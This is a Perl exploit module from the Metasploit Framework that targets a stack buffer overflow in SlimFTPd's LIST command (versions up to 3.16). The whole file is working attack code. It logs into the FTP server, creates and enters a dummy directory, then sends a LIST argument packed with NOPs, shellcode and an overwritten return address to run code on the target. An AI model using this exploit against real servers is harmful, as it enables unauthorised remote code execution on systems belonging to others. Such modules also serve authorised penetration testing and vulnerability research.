##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::slimftpd_list_concat;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'SlimFTPd LIST Concatenation Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'Fairuzan Roslan <riaf [at] mysec.org>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'ftp'],
		'PASS'  => [1, 'DATA', 'Password', 'metasploit@'],
	  },

	'Payload'  =>
	  {
		'Space' => 490,
		'BadChars'  => "\x00\x0a\x0d\x20\x5c\x2f",
		'Keys' => ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the SlimFTPd
	server. The flaw is triggered when a LIST command is received
	with an overly-long argument. This vulnerability affects all
	versions of SlimFTPd prior to 3.16 and was discovered by
	Rapha
�
�l Rigo.
}),

	'Refs'  =>
	  [
		['OSVDB', '18172'],
		['BID',   '14339'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['SlimFTPd Server <= 3.16 Universal', 0x0040057d],
	  ],

	'Keys'  => ['slimftpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $evil = ("LIST ");
	$evil .= $self->MakeNops(512);
	substr($evil, 10, length($shellcode), $shellcode);
	substr($evil, 507, 4, pack("V", $target->[1]));
	substr($evil, 511, 2, "\x0a\x0d");

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));

	my $r = $s->Recv(-1, 30);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	($r) = $r =~ m/^([^\n\r]+)(\r|\n)/;
	$self->PrintLine("[*] $r");

	$self->PrintLine("[*] Login as " .$self->GetVar('USER'). "/" .$self->GetVar('PASS'));
	$s->Send("USER ".$self->GetVar('USER')."\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

	$s->Send("PASS ".$self->GetVar('PASS')."\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }

	$self->PrintLine("[*] Creating dummy directory....");
	$s->Send("XMKD 41414141\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print("[*] $r");

	$self->PrintLine("[*] Changing to dummy directory....");
	$s->Send("CWD 41414141\r\n");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print("[*] $r");

	$self->PrintLine("[*] Sending evil buffer....");
	$s->Send($evil);
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print("[*] $r");
	return;
}

